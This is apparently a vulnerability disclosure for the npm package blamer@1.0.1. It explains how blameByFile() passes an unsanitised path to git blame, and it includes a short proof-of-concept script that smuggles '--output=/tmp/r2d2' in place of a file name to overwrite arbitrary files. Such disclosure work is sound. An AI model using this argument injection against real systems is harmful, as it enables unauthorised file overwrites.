Argument Injection vulnerability in `blamer@1.0.1`

 [Raw](/lirantal/14c3686370a86461f555d3f0703e02f9/raw/09d242c2d561e7a10f799cd5f1d70043500b27da/blamer-argument-injection.md)

# Argument Injection vulnerability in `blamer@1.0.1`

`blamer` describes itself as:

```
Blamer is a tool for get information about author of code from version control system. Supports git and subversion.

```

Resources:

* Project's GitHub source code: <https://github.com/kucherenko/blamer>
* Project's npm package: <https://www.npmjs.com/package/blamer>

## Background on exploitation

I'm reporting an Argument Injection vulnerability in `blamer` npm package.

This vulnerability manifests with the library's `blameByFile()` API,
which allows specifying the file path to run `git blame` on. However, the library
does not sanitize for user input or validate the given file path conforms to specific schema,
nor does it properly pass command-line flags to the `git` binary using the double-dash
POSIX characters (`--`) to communicate the end of options.

Thus, allowing users to exploit an argument injection vulnerability in Git due to the
`--output=` command-line option that results with overwriting arbitrary files.

## Exploit

1. Install `blamer@1.0.1` or earlier
2. Initiaizlie a new Git directory with commits in it
3. Create the following script in that directory:

```
// you might need to set `type: module` in `package.json`
// if you're running this as a Node.js script initializex
// in an npm project

import Blamer from "blamer";
const blamer = new Blamer.default("git");

async function main() {
  const file = "--output=/tmp/r2d2";
  const result = await blamer.blameByFile(file);
  console.log("Blame json: %j", result);
}

main();
```

3. Observe new file created on disk at `/tmp/r2d2`
